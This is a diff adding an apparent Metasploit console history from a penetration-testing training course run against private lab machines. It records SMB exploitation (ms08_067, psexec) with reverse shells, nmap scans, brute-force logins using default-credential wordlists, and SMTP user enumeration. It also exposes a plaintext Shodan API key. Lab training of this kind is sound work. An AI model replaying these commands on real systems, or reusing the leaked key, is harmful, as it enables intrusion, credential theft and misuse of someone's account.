@@ -1,0 +1,691 @@
+1    exit
+2    clear
+3    pwd
+4    cd msf_training_01/
+5    pwd
+6    ls
+7    clear
+8    systemctl postgresql status
+9    clear
+10   help search
+11   clear
+12   search type:exploit
+13   clear
+14   search type:exploit ms08_067
+15   use exploit/windows/smb/ms08_067_netapi
+16   clear
+17   show option
+18   show options
+19   set RHOSTS 192.168.56.104
+20   show options
+21   set LHOST 192.168.56.101
+22   clear
+23   show options
+24   exploit
+25   show payloads
+26   set payload 129
+27   clear
+28   show options
+29   exploit
+30   set RHOSTS 192.168.56.11
+31   exploit
+32   set RHOSTS 192.168.56.111
+33   clear
+34   exploit
+35   exit -y
+36   search type:exploit netapi
+37   use 3
+38   show options
+39   clear
+40   show options
+41   set payload 129
+42   show options
+43   set payload 61
+44   show options
+45   show payloads
+46   set payload 129
+47   show payloads
+48   show options
+49   set RHOSTS 192.168.56.111
+50   clear
+51   exploit
+52   show options
+53   set RHOSTS 192.168.56.110
+54   clear
+55   exploit
+56   clear
+57   show options
+58   set LHOST 192.168.56.104
+59   show options
+60   set RHOSTS 192.168.56.111
+61   exploit
+62   set RHOSTS 192.168.56.115
+63   exploit
+64   searh type:exploit netapi
+65   search type:exploit netapi
+66   use 3
+67   show payloads
+68   set payload 129
+69   show options
+70   show missing
+71   clear
+72   show options
+73   setg LHOST 192.168.56.101
+74   show options
+75   set LHOST
+76   set LHOST 192.168.56.101
+77   show options
+78   setg LHOST 192.168.56.101
+79   clear
+80   show options
+81   clear
+82   advanced
+83   clear
+84   show advanced
+85   clear
+86   show options
+87   set RHOSTS 192.168.56.111
+88   setg RHOSTS 192.168.56.111
+89   clear
+90   show options
+91   exploit
+92   grep netapi search type:exploit
+93   search type:exploit netapi
+94   use 3
+95   clear
+96   show options
+97   set RHOSTS 192.168.56.111
+98   set LHOST 192.168.56.101
+99   clear
+100  show options
+101  exploit
+102  sessions
+103  clear
+104  sessions
+105  exploit
+106  exit -y
+107  searchb type:exploit netapi
+108  search type:exploit netapi
+109  use 3
+110  show payloads
+111  set payload 129
+112  clear
+113  show options
+114  set RHOSTS 192.168.56.111
+115  set LHOST 192.168.56.101
+116  clear
+117  test
+118  exploit
+119  use payload windows/shell/bind_tcp
+120  use 1
+121  show options
+122  generate -h
+123  clear;ls
+124  exit -y
+125  use exploit/windows/smb/psexec
+126  clear
+127  show options
+128  set RHOSTS 192.168.56.112
+129  set LHOST 192.168.56.101
+130  set SMBUser analyst01
+131  set SMBPass analyst01
+132  clear
+133  show options
+134  exploit
+135  clear
+136  exploit
+137  show options
+138  set SMBUser victim
+139  set SMBPass Password123
+140  clear
+141  show options
+142  clear
+143  exploit
+144  show options
+145  set SMBSHARE C$
+146  exploit
+147  set SMBSHARE Users$
+148  exploit
+149  set SMBSHARE USERS$
+150  exploit
+151  unset SMBSHARE
+152  clear
+153  exploit
+154  show options
+155  set SMBSHARE Z$
+156  exploit
+157  unset SMBSHARE
+158  clear
+159  show options
+160  clear
+161  exploit
+162  clear
+163  show options
+164  set SMBUser analyst01
+165  set SMBPass analyst01
+166  clear
+167  set RHOSTS 192.168.56.112
+168  clear
+169  show options
+170  exploit
+171  clear
+172  show payloads
+173  set payload windows/shell/reverse_tcp
+174  clear
+175  show option
+176  show options
+177  exploit
+178  use exploit/windows/smb/psexec
+179  show options
+180  set SMBUser analyst01
+181  set SMBPass analyst01
+182  clear
+183  show options
+184  set RHOSTS 192.168.56.112
+185  show options
+186  exploit
+187  clear
+188  show options
+189  set LHOST 192.168.56.101
+190  exploit
+191  clear
+192  sessions
+193  sessions -i 1
+194  sessions
+195  clear
+196  sessions -i 1
+197  exit -y
+198  use exploit/windows/smb/psexec
+199  SHOW OPTIONS
+200  show options
+201  set RHOSTS 192.168.56.112
+202  set LHOST 192.168.56.101
+203  set SMBUser analyst01
+204  set SMBPass analyst01
+205  clear
+206  show options
+207  exploit
+208  search exploit:smb
+209  search type:exploit smb
+210  search ms08_067
+211  use 0
+212  clear
+213  show options
+214  set RHOSTS 192.168.56.111
+215  set LHOST 192.168.56.101
+216  show payloads
+217  set payload windows/shell/reverse_tcp
+218  clear
+219  show options
+220  exploit -j
+221  clear
+222  sessions
+223  sessions -u 1
+224  exit -y
+225  sessions -u 1
+226  exit -y
+227  sessions -u 1
+228  exit -y
+229  clear
+230  sessions
+231  exit -y
+232  sessions -u 1
+233  exit -y
+234  sessions
+235  sessions -u 1
+236  exit -y
+237  sessions -u 1
+238  exit -y
+239  sessions -u 1
+240  exit -y
+241  sessions -u 1
+242  use post/multi/manage/shell_to_meterpreter
+243  clear
+244  show options
+245  show advanced
+246  clear;ls
+247  clear
+248  sessions
+249  sessions -i 1
+250  clear;ls
+251  clear
+252  exit -y
+253  use exploit/multi/handler
+254  show options
+255  set LHOST eth1
+256  run
+257  clear
+258  show jobs
+259  jobs
+260  set payload windows/meterpreter/reverse_tcp
+261  show options
+262  clear
+263  run
+264  exit -y
+265  db_status
+266  db_connect msf:msf@localhost:5432/msf
+267  exit
+268  db_status
+269  workspace
+270  exit
+271  dg_status
+272  db_status
+273  exit
+274  db_status
+275  version
+276  history
+277  history 269
+278  help history
+279  history n 269
+280  help history
+281  clear;ls
+282  clear
+283  pwd
+284  ls
+285  cd 1_reconnaissance/
+286  ls
+287  workspace -a msf_course_01
+288  pwd
+289  cd ../
+290  pwd
+291  cd course_01/1_reconnaissance/
+292  clear
+293  ls
+294  workspace
+295  db_nmap -sS -A -Pn --top-ports 192.168.4.1/24
+296  db_nmap -sS -A -Pn --top-ports 100 192.168.4.1/24
+297  services
+298  help db_import
+299  hosts
+300  help hosts
+301  hosts -d 192.168.4.20
+302  hosts -d 192.168.4.21
+303  hosts -d 192.168.4.23
+304  clear
+305  hosts
+306  hosts -d 192.168.4.25
+307  clear
+308  help hosts
+309  hosts -i 192.168.4.1
+310  hosts -n 192.168.4.1 EERO_ROUTER
+311  help hosts --name
+312  hosts 192.168.4.1 -n EERO_ROUTER
+313  clear
+314  hosts
+315  db_nmap -sS -A -Pn --top-ports 100 192.168.4.29 -v
+316  hosts
+317  db_nmap -sS -A -Pn --top-ports 100 192.168.4.29 -v
+318  clear
+319  hosts
+320  db_nmap -sU -A -Pn --top-ports 20 192.168.4.1/24 -v
+321  clear
+322  hosts
+323  hosts -d 192.168.4.20
+324  hosts -d 192.168.4.23
+325  hosts -d 192.168.4.25
+326  clear
+327  hosts
+328  hosts -d 192.168.4.31
+329  clear
+330  help services
+331  help hosts
+332  services -S 12.168.4.42
+333  services -S 192.168.4.42
+334  clear
+335  services
+336  services -S 192.168.4.42
+337  services -S snmp
+338  hosts -S 192.168.4.42
+339  hosts -S 192.168.4.42 -c address,name,os_name
+340  clear
+341  help services
+342  search portscan type:auxiliary
+343  use 6
+344  clear
+345  info
+346  clear
+347  show options
+348  set RHOSTS 192.168.4.32,36,50
+349  run
+350  back
+351  services -p 139,445
+352  services -p 139,445 -o
+353  services -p 139,445 -u
+354  search smb_version type:auxiliary
+355  use 0
+356  clear
+357  show options
+358  services -p 139,445 -u
+359  set RHOSTS 192.168.4.29,32,36,38,41,42,46,50,51
+360  run
+361  clear
+362  back
+363  search ms17 type:auxiliary
+364  use 1
+365  show options
+366  set RHOSTS 192.168.4.32
+367  clear
+368  run
+369  set RHOSTS 192.168.4.50
+370  run
+371  set RHOSTS 192.168.4.36
+372  run
+373  show options
+374  set smbuser lu.tze
+375  set smbpass Password123!
+376  run
+377  clear
+378  show options
+379  set smbdomain discworld.io
+380  run
+381  set smbdomain discworld
+382  run
+383  clear
+384  back
+385  search smb_lobin type:auxiliary
+386  search smb_login type:auxiliary
+387  use 0
+388  show options
+389  set rhosts 192.168.4.50,51
+390  pwd
+391  clear
+392  show options
+393  set smbuser vagrant
+394  set pass_file ms3_pass.txt
+395  clear
+396  show options
+397  run
+398  set stop_on_success true
+399  clear
+400  show options
+401  clear
+402  run
+403  set rhosts 192.168.4.50
+404  show options
+405  clear
+406  run
+407  set stop_on_success false
+408  clear
+409  run
+410  show options
+411  back
+412  use auxiliary/scanner/smb/smb_login
+413  show options
+414  clear
+415  show options
+416  set RHOSTS 192.168.4.50
+417  set smbuser vagrant
+418  set pass_file ms3_pass.txt
+419  clear
+420  show options
+421  clear
+422  run
+423  show options
+424  set stop_on_success true
+425  clear
+426  run
+427  search mysql type:exploit
+428  search mysql
+429  clear
+430  show options
+431  set rhosts 192.168.4.36
+432  clear
+433  show options
+434  set stop_on_success False
+435  show options
+436  clear
+437  run
+438  back
+439  clear
+440  services -S mysql
+441  search mysql type:auxiliary
+442  use 11
+443  clear
+444  show options
+445  services -S mysql
+446  set RHOSTS 192.168.4.32,36,50
+447  clear
+448
+449  search mysql type:auxiliary
+450  use 9
+451  clear
+452  show options
+453  setg RHOSTS 192.168.4.32,36,50
+454  show options
+455  clear
+456  set blank_passwords true
+457  show options
+458  set userpass_file /usr/share/wordlists/seclists/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt
+459  clear
+460  run
+461  services -S mysql
+462  back
+463  services -S ftp
+464  services -S ftp -u
+465  search ftp type:auxiliary
+466  search ftp type:auxiliary | grep scanner
+467  search ftp type:scanner
+468  search ftp type:auxiliary
+469  use auxiliary/scanner/ftp/ftp_version
+470  clear
+471  show options
+472  run
+473  services -S ftp -o
+474  services -S ftp -u
+475  setg RHOSTS 192.168.4.32,46,50
+476  run
+477  clear
+478  run
+479  search vsFTPd type:exploit
+480  use 0
+481  show options
+482  set RHOSTS 192.168.4.32
+483  show options
+484  show payloads
+485  clear
+486  back
+487  use auxiliary/ftp/ftp_login
+488  search ftp_login type:auxiliary
+489  use 0
+490  clear
+491  show options
+492  set blank_passwords true
+493  set user_as_pass true
+494  set userpass_file /usr/share/wordlists/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt
+495  clear
+496  run
+497  show options
+498  clear
+499  show options
+500  services -S ftp -u
+501  clear
+502  run
+503  clear
+504  services -S ftp -u
+505  use auxiliary/scanner/ftp/anonymous
+506  show options
+507  run
+508  clear
+509  back
+510  help pushm
+511  help
+512  listm
+513  use auxiliary/scanner/ftp/anonymous
+514  pushm
+515  show options
+516  clear
+517  show options
+518  search ftp_login type:auxiliary
+519  use 0
+520  show options
+521  pushm
+522  listm
+523  use 0
+524  history | grep use
+525  use auxiliary/scanner/ftp/ftp_version
+526  clear
+527  show options
+528  pushm
+529  listm
+530  getg userpass_file
+531  listm
+532  use 1
+533  previous
+534  listm
+535  help previous
+536  back
+537  clear
+538  search ssh type:auxiliary
+539  search name:ssh type:auxiliary
+540  use 13
+541  clear
+542  show options
+543  services -S ssh -u
+544  set RHOSTS 192.168.4.32,50
+545  show options
+546  run
+547  clear
+548  search name:ssh type:auxiliary
+549  use 8
+550  history
+551  clear
+552  show options
+553  setg user_as_pass true
+554  setg blank_passwords true
+555  show options
+556  set userpass_file /usr/share/wordlists/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt
+557  clear show options
+558  clear
+559  show options
+560  services -S ssh -u
+561  set rhosts 192.168.4.32,50
+562  clear
+563  show options
+564  show missing
+565  run
+566  back
+567  clear;ls
+568  clear
+569  search name:http type:auxiliary | grep scanner
+570  search name:http type:auxiliary
+571  search name:http type:scanner
+572  search name:http type:auxiliary | grep scanner
+573  search name:http type:scanner
+574  search name:http type:auxiliary
+575  clear
+576  services -s http -u
+577  services -S http -u
+578  services -S ssl/http -u
+579  services -S https -u
+580  services
+581  services | grep 443
+582  help services
+583  services -p 443
+584  services -S ssl -u
+585  services -p 8383
+586  clear
+587  services -S http -u
+588  search http type:auxiliary
+589  search name:http type:auxiliary
+590  help services
+591  clear
+592  use auxiliary/scanner/http/
+593  use auxiliary/scanner/http/http_version
+594  search name:http type:auxiliary
+595  services -S ssl
+596  clear
+597  use auxiliary/scanner/http/crawler
+598  show options
+599  setg httppassword test@test.com
+600  setg httppassword test1
+601  setg httpusername test@test.com
+602  clear
+603  show options
+604  set rhosts 192.168.4.40
+605  set rport 3000
+606  clear
+607  show options
+608  show missing
+609  run
+610  pushm
+611  use auxiliary/scanner/http/http_put
+612  show options
+613  set path /stuff
+614  run
+615  set path /temp
+616  run
+617  set path /stuff
+618  run
+619  show options
+620  set rhosts 192.168.4.40
+621  set rport 3000
+622  clear
+623  run
+624  set path /stuff
+625  run
+626  set path /temp
+627  run
+628  clear
+629  services -S snmp -0
+630  services -S snmp -o
+631  services -S snmp -u
+632  search name:snmp type:auxiliary
+633  use 8
+634  clear
+635  show options
+636  services -S snmp -u
+637  set rhosts 192.168.4.36
+638  run
+639  clear
+640  services -S smtp -u
+641  search name|:smtp type:auxiliary
+642  services -S smtp -u
+643  telnet 192.168.4.32 25
+644  back
+645  clear
+646  erh ae:smtp type:auxiliary
+647  history
+648  workspace
+649  clear
+650  workspace -l
+651  help workspace
+652  workspace msf_course_01
+653  use auxiliary/scanner/smtp/smtp_version
+654  show options
+655  services -S smtp -u
+656  set rhosts 192.168.4.32,46
+657  show options
+658  run
+659  clear
+660  use auxiliary/scanner/smtp/smtp
+661  use auxiliary/scanner/smtp/smtp_enum
+662  show options
+663  setg rhosts 192.168.4.32,46
+664  show options
+665  clear
+666  set threads 10
+667  run
+668  services -S smtp -u
+669  setg rhosts 192.168.4.32
+670  run
+671  set threads 1
+672  run
+673  clear
+674  back
+675  search shodan type:auxiliary
+676  use 5
+677  show options
+678  set SHODAN_APIKEY 9N5wPAoPEiBvZtUEJaNf4kvS25yyZGqb
+679  clear
+680  show options
+681  set query "mypmyadmin"
+682  run
+683  set query "phpmyadmin"
+684  run
+685  clear
+686  spool msf_enum.txt
+687  pwd
+688  exit
+689  workspace msf_course_01
+690  help history
+691  history -n 1000
